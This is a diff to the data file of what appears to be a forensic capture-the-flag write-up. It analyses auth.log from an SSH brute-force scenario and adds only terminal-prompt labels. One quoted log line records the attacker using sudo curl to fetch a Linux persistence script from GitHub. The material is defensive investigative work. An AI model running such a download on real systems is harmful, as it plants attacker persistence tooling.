@@ -62,6 +62,7 @@ cards:
     explanation: |
                  To find this, we can query the log for accepted passwords from the attacker's IP.We can correlate the time the brute force attacks stopped with the time   each account's password was accepted We can see that right after a certain account's password was cracked the attacker stopped brute forcing.
     terminal_title: "auth.log"
+    prompt2: "/home/ningen>"
     terminal_code1: "cat auth.log|grep -i accepted |grep 65.2.161.68"
     terminal_output1: |-
       [Mar 6 06:31:40]: Accepted password for root from 65.2.161.68
@@ -85,6 +86,7 @@ cards:
     explanation: |
                  If we go back to question 2 and look at the script block area, we will see the timestamp of when the attacker manually logged in as root (the second output). It is not the first because the first output was part of the brute force attack. To find the answer for this, we need to `cat` the auth.log and filter the exact timestamp the user logged in as root and then look at the session ID given.
     terminal_title: "auth.log"
+    prompt: "testing>"
     terminal_code1: "cat auth.log|grep 06:32:44"
     terminal_output1: |-
       [Mar 6 06:32:44]: Accepted password for root from 65.2.161.68
@@ -116,6 +118,7 @@ cards:
     explanation: |
                  At first I thought the answer would be the actual first one, but instead we have to look for the one they manually logged in to. Since we already know that the attacker's first manual login had a session ID of 37, we can filter out the events for only session 37 we will see the time he first logged on and the time that account logged out.
     terminal_title: "auth.log"
+    prompt7: "not testing>"
     terminal_code1: "cat auth.log|grep -i \"session 37\""
     terminal_output1: |-
       [Mar 6 06:32:44] systemd-logind[411]: New session 37 of user root.
@@ -137,5 +140,7 @@ cards:
       [Mar 6 06:39:38] ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 
 #stuff
+configure:
+  prompt: "/home/ningen/brutus>"
 ---
 {% include writeup-data.html %}
